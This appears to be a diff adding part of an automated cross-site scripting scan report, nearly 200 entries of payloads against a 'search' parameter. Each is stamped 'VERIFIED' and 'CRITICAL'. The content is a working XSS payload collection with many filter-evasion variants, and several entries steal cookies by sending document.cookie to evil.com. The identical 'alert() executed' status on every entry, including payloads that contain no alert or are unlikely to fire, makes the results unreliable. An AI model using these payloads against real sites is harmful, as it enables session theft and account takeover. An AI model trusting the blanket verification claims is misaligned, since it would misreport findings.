+[206] Parameter: search
+    Payload: <svg/onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[207] Parameter: search
+    Payload: <svg//onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[208] Parameter: search
+    Payload: %3Cscript%3Ealert(1)%3C/script%3E
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[209] Parameter: search
+    Payload: %3Cimg%20src=x%20onerror=alert(1)%3E
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[210] Parameter: search
+    Payload: %3Csvg%20onload=alert(1)%3E
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[211] Parameter: search
+    Payload: <script>alert`1`</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[212] Parameter: search
+    Payload: <img src=x onerror=alert`1`>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[213] Parameter: search
+    Payload: <svg onload=alert`1`>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[214] Parameter: search
+    Payload: <script>/**/alert(1)/**/</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[215] Parameter: search
+    Payload: <script><!---->alert(1)<!----></script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[216] Parameter: search
+    Payload: <img src=x onerror=/**/alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[217] Parameter: search
+    Payload: <script>eval('alert(1)')</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[218] Parameter: search
+    Payload: <script>eval("alert(1)")</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[219] Parameter: search
+    Payload: <script>eval(atob('YWxlcnQoMSk='))</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[220] Parameter: search
+    Payload: <img src=x onerror=eval('alert(1)')>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[221] Parameter: search
+    Payload: <svg onload=eval('alert(1)')>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[222] Parameter: search
+    Payload: <script>Function('alert(1)')()</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[223] Parameter: search
+    Payload: <script>new Function('alert(1)')()</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[224] Parameter: search
+    Payload: <img src=x onerror=Function('alert(1)')()>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[225] Parameter: search
+    Payload: <script>setTimeout('alert(1)',0)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[226] Parameter: search
+    Payload: <script>setTimeout("alert(1)",0)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[227] Parameter: search
+    Payload: <script>setInterval('alert(1)',0)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[228] Parameter: search
+    Payload: <img src=x onerror=setTimeout('alert(1)',0)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[229] Parameter: search
+    Payload: <script>location='javascript:alert(1)'</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[230] Parameter: search
+    Payload: <script>location.href='javascript:alert(1)'</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[231] Parameter: search
+    Payload: <script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[232] Parameter: search
+    Payload: <script>\u0061lert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[233] Parameter: search
+    Payload: <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[234] Parameter: search
+    Payload: <img src=x onerror=\u0061lert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[235] Parameter: search
+    Payload: <script>eval('\x61lert(1)')</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[236] Parameter: search
+    Payload: <script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[237] Parameter: search
+    Payload: <script>alert(String.fromCharCode(88,83,83))</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[238] Parameter: search
+    Payload: <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[239] Parameter: search
+    Payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[240] Parameter: search
+    Payload: <script>document.write('<svg onload=alert(1)>')</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[241] Parameter: search
+    Payload: <script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[242] Parameter: search
+    Payload: <a href=javascript:alert(1)>X</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[243] Parameter: search
+    Payload: <a href="javascript:alert(1)">X</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[244] Parameter: search
+    Payload: <a href='javascript:alert(1)'>X</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[245] Parameter: search
+    Payload: <a href=j&#x61vascript:alert(1)>X</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[246] Parameter: search
+    Payload: <a href=j&#97vascript:alert(1)>X</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[247] Parameter: search
+    Payload: <form><button formaction=javascript:alert(1)>X</button></form>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[248] Parameter: search
+    Payload: <form><input formaction=javascript:alert(1) type=submit value=X></form>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[249] Parameter: search
+    Payload: <form><input type=submit formaction=javascript:alert(1) value=X></form>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[250] Parameter: search
+    Payload: <base href=javascript:alert(1)//>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[251] Parameter: search
+    Payload: <script>import('data:text/javascript,alert(1)')</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[252] Parameter: search
+    Payload: <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[253] Parameter: search
+    Payload: <div id=x tabindex=1 onactivate=alert(1)></div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[254] Parameter: search
+    Payload: <div contenteditable onblur=alert(1)>test</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[255] Parameter: search
+    Payload: <div draggable=true ondrag=alert(1)>test</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[256] Parameter: search
+    Payload: <svg><animate onbegin=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[257] Parameter: search
+    Payload: <svg><set onbegin=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[258] Parameter: search
+    Payload: <svg><animatemotion onbegin=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[259] Parameter: search
+    Payload: <svg><animatetransform onbegin=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[260] Parameter: search
+    Payload: <svg><discard onbegin=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[261] Parameter: search
+    Payload: <math><maction actiontype=toggle onclick=alert(1)>X</maction></math>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[262] Parameter: search
+    Payload: <iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[263] Parameter: search
+    Payload: <iframe srcdoc="<script>alert(1)</script>"></iframe>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[264] Parameter: search
+    Payload: <iframe srcdoc="<svg onload=alert(1)>"></iframe>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[265] Parameter: search
+    Payload: <img name=alert src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[266] Parameter: search
+    Payload: <form name=alert><input type=submit onclick=alert(1)></form>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[267] Parameter: search
+    Payload: <script>alert(document.cookie)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[268] Parameter: search
+    Payload: <script>fetch('http://evil.com?c='+document.cookie)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[269] Parameter: search
+    Payload: <img src=x onerror=this.src='http://evil.com?c='+document.cookie>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[270] Parameter: search
+    Payload: <svg onload=fetch('http://evil.com?c='+document.cookie)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[271] Parameter: search
+    Payload: <script>document.body.innerHTML+=alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[272] Parameter: search
+    Payload: <script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[273] Parameter: search
+    Payload: <body/onhashchange=alert(1)><a href=#x>clickme</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[274] Parameter: search
+    Payload: <body/onpopstate=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[275] Parameter: search
+    Payload: <body/onpageshow=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[276] Parameter: search
+    Payload: <body/onpagehide=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[277] Parameter: search
+    Payload: <body/onstorage=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[278] Parameter: search
+    Payload: <script>new WebSocket('ws://evil.com').onopen=alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[279] Parameter: search
+    Payload: <script><![CDATA[alert(1)]]></script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[280] Parameter: search
+    Payload: <?xml version="1.0"?><script>alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[281] Parameter: search
+    Payload: <?xml-stylesheet type="text/xsl" href="javascript:alert(1)"?>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[282] Parameter: search
+    Payload: <source src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[283] Parameter: search
+    Payload: <track src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[284] Parameter: search
+    Payload: <image src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[285] Parameter: search
+    Payload: <use href=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[286] Parameter: search
+    Payload: <input autofocus onfocus=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[287] Parameter: search
+    Payload: <textarea autofocus onfocus=alert(1)></textarea>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[288] Parameter: search
+    Payload: <select autofocus onfocus=alert(1)></select>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[289] Parameter: search
+    Payload: <button autofocus onfocus=alert(1)>X</button>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[290] Parameter: search
+    Payload: <div onpointerdown=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[291] Parameter: search
+    Payload: <div onpointerup=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[292] Parameter: search
+    Payload: <div onpointerover=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[293] Parameter: search
+    Payload: <div onpointerenter=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[294] Parameter: search
+    Payload: <div onpointerleave=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[295] Parameter: search
+    Payload: <div onpointermove=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[296] Parameter: search
+    Payload: <div ontouchstart=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[297] Parameter: search
+    Payload: <div ontouchend=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[298] Parameter: search
+    Payload: <div ontouchmove=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[299] Parameter: search
+    Payload: <div style="animation:spin 1s" onanimationstart=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[300] Parameter: search
+    Payload: <div style="animation:spin 1s" onanimationend=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[301] Parameter: search
+    Payload: <div style="animation:spin 1s" onanimationiteration=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[302] Parameter: search
+    Payload: <div style="transition:all 1s" ontransitionend=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[303] Parameter: search
+    Payload: <div data-x=x onclick=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[304] Parameter: search
+    Payload: <input accesskey=x onclick=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[305] Parameter: search
+    Payload: <div contenteditable oninput=alert(1)>X</div>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[306] Parameter: search
+    Payload: <input type=hidden onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[307] Parameter: search
+    Payload: <select><option oninput=alert(1)>X</option></select>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[308] Parameter: search
+    Payload: <img/src="x"/onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[309] Parameter: search
+    Payload: <img%20src=x%20onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[310] Parameter: search
+    Payload: <img	src=x	onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[311] Parameter: search
+    Payload: <script	>alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[312] Parameter: search
+    Payload: >alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[313] Parameter: search
+    Payload: src=//evil.com></script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[314] Parameter: search
+    Payload: <svg/onload=prompt(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[315] Parameter: search
+    Payload: <svg/onload=confirm(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[316] Parameter: search
+    Payload: <svg/onload=print()>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[317] Parameter: search
+    Payload: <marquee onstart=prompt(1)>X</marquee>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[318] Parameter: search
+    Payload: <marquee onstart=confirm(1)>X</marquee>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[319] Parameter: search
+    Payload: <iframe/src=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[320] Parameter: search
+    Payload: <iframe/onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[321] Parameter: search
+    Payload: <iframe%20src=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[322] Parameter: search
+    Payload: <object/data=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[323] Parameter: search
+    Payload: <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[324] Parameter: search
+    Payload: <embed/src=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[325] Parameter: search
+    Payload: <embed src=data:text/html,<script>alert(1)</script>>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[326] Parameter: search
+    Payload: <var onmouseover=alert(1)>X</var>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[327] Parameter: search
+    Payload: <code onmouseover=alert(1)>X</code>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[328] Parameter: search
+    Payload: <span onmouseover=alert(1)>X</span>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[329] Parameter: search
+    Payload: <p onmouseover=alert(1)>X</p>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[330] Parameter: search
+    Payload: <h1 onmouseover=alert(1)>X</h1>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[331] Parameter: search
+    Payload: <h2 onmouseover=alert(1)>X</h2>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[332] Parameter: search
+    Payload: <pre onmouseover=alert(1)>X</pre>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[333] Parameter: search
+    Payload: <blockquote onmouseover=alert(1)>X</blockquote>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[334] Parameter: search
+    Payload: <ol onmouseover=alert(1)><li>X</li></ol>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[335] Parameter: search
+    Payload: <ul onmouseover=alert(1)><li>X</li></ul>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[336] Parameter: search
+    Payload: <li onmouseover=alert(1)>X</li>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[337] Parameter: search
+    Payload: <dl onmouseover=alert(1)><dt>X</dt></dl>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[338] Parameter: search
+    Payload: <dt onmouseover=alert(1)>X</dt>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[339] Parameter: search
+    Payload: <dd onmouseover=alert(1)>X</dd>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[340] Parameter: search
+    Payload: <fieldset onmouseover=alert(1)>X</fieldset>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[341] Parameter: search
+    Payload: <legend onmouseover=alert(1)>X</legend>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[342] Parameter: search
+    Payload: <label onmouseover=alert(1)>X</label>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[343] Parameter: search
+    Payload: <table><caption onmouseover=alert(1)>X</caption></table>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[344] Parameter: search
+    Payload: <table><colgroup onmouseover=alert(1)></colgroup></table>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[345] Parameter: search
+    Payload: <table><col onmouseover=alert(1)></table>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[346] Parameter: search
+    Payload: <table><thead onmouseover=alert(1)></thead></table>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[347] Parameter: search
+    Payload: <table><tbody onmouseover=alert(1)></tbody></table>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[348] Parameter: search
+    Payload: <table><tfoot onmouseover=alert(1)></tfoot></table>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[349] Parameter: search
+    Payload: <table><tr onmouseover=alert(1)></tr></table>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[350] Parameter: search
+    Payload: <table><th onmouseover=alert(1)>X</th></table>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[351] Parameter: search
+    Payload: <table><td onmouseover=alert(1)>X</td></table>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[352] Parameter: search
+    Payload: <meter onmouseover=alert(1)>X</meter>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[353] Parameter: search
+    Payload: <progress onmouseover=alert(1)>X</progress>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[354] Parameter: search
+    Payload: <output onmouseover=alert(1)>X</output>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[355] Parameter: search
+    Payload: <time onmouseover=alert(1)>X</time>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[356] Parameter: search
+    Payload: <mark onmouseover=alert(1)>X</mark>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[357] Parameter: search
+    Payload: <ruby onmouseover=alert(1)>X</ruby>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[358] Parameter: search
+    Payload: <ruby><rt onmouseover=alert(1)>X</rt></ruby>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[359] Parameter: search
+    Payload: <ruby><rp onmouseover=alert(1)>X</rp></ruby>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[360] Parameter: search
+    Payload: <bdi onmouseover=alert(1)>X</bdi>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[361] Parameter: search
+    Payload: <bdo onmouseover=alert(1)>X</bdo>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[362] Parameter: search
+    Payload: <wbr onmouseover=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[363] Parameter: search
+    Payload: <ins onmouseover=alert(1)>X</ins>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[364] Parameter: search
+    Payload: <del onmouseover=alert(1)>X</del>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[365] Parameter: search
+    Payload: <small onmouseover=alert(1)>X</small>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[366] Parameter: search
+    Payload: <strong onmouseover=alert(1)>X</strong>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[367] Parameter: search
+    Payload: <em onmouseover=alert(1)>X</em>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[368] Parameter: search
+    Payload: <b onmouseover=alert(1)>X</b>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[369] Parameter: search
+    Payload: <i onmouseover=alert(1)>X</i>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[370] Parameter: search
+    Payload: <u onmouseover=alert(1)>X</u>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[371] Parameter: search
+    Payload: <s onmouseover=alert(1)>X</s>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[372] Parameter: search
+    Payload: <sub onmouseover=alert(1)>X</sub>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[373] Parameter: search
+    Payload: <sup onmouseover=alert(1)>X</sup>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[374] Parameter: search
+    Payload: <abbr onmouseover=alert(1)>X</abbr>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[375] Parameter: search
+    Payload: <address onmouseover=alert(1)>X</address>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[376] Parameter: search
+    Payload: <article onmouseover=alert(1)>X</article>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[377] Parameter: search
+    Payload: <aside onmouseover=alert(1)>X</aside>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[378] Parameter: search
+    Payload: <footer onmouseover=alert(1)>X</footer>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[379] Parameter: search
+    Payload: <header onmouseover=alert(1)>X</header>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[380] Parameter: search
+    Payload: <hgroup onmouseover=alert(1)>X</hgroup>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[381] Parameter: search
+    Payload: <nav onmouseover=alert(1)>X</nav>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[382] Parameter: search
+    Payload: <section onmouseover=alert(1)>X</section>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[383] Parameter: search
+    Payload: <main onmouseover=alert(1)>X</main>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[384] Parameter: search
+    Payload: <figure onmouseover=alert(1)>X</figure>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[385] Parameter: search
+    Payload: <figcaption onmouseover=alert(1)>X</figcaption>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[386] Parameter: search
+    Payload: <dialog onmouseover=alert(1)>X</dialog>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[387] Parameter: search
+    Payload: <menu onmouseover=alert(1)>X</menu>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[388] Parameter: search
+    Payload: <menuitem onmouseover=alert(1)>X</menuitem>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[389] Parameter: search
+    Payload: <details><summary onmouseover=alert(1)>X</summary></details>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[390] Parameter: search
+    Payload: <canvas onmouseover=alert(1)>X</canvas>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[391] Parameter: search
+    Payload: <button onclick=alert(1)>X</button>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[392] Parameter: search
+    Payload: <button ondblclick=alert(1)>X</button>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[393] Parameter: search
+    Payload: <button onmousedown=alert(1)>X</button>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[394] Parameter: search
+    Payload: <button onmouseup=alert(1)>X</button>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[395] Parameter: search
+    Payload: "><script>alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[396] Parameter: search
+    Payload: '><script>alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[397] Parameter: search
+    Payload: "></script><script>alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[398] Parameter: search
+    Payload: ';alert(1);//
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[399] Parameter: search
+    Payload: ";alert(1);//
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[400] Parameter: search
+    Payload: " onmouseover=alert(1) x="
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[401] Parameter: search
+    Payload: "onmouseover="alert(1)
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[402] Parameter: search
+    Payload: ' onmouseover=alert(1) x='
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[403] Parameter: search
+    Payload: " autofocus onfocus=alert(1) x="
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[404] Parameter: search
+    Payload: ' autofocus onfocus=alert(1) x='
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
